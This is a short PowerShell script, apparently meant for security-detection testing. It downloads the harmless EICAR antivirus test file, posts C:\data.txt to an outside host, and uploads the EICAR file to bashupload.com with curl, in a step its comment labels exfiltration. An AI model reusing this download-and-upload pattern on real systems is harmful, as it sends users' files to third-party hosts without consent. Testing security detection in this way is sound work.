Invoke-WebRequest -Uri "http://malware.wicar.org/data/eicar.com" -Method Post -InFile "C:\data.txt"

# Define the file path
$FilePath = "C:\Users\Public\eicar.com"

# Download the EICAR test file if it doesn't already exist
if (!(Test-Path $FilePath)) {
    Invoke-WebRequest -Uri "http://malware.wicar.org/data/eicar.com" -OutFile $FilePath
    Write-Output "EICAR test file downloaded."
} else {
    Write-Output "EICAR test file already exists."
}

# Define the upload URL
$UploadURL = "https://bashupload.com/eicar.com"

# Exfiltrate the file using curl
$curlCommand = "curl -T `"$FilePath`" `"$UploadURL`""
Invoke-Expression $curlCommand

Write-Output "File uploaded to bashupload.com"
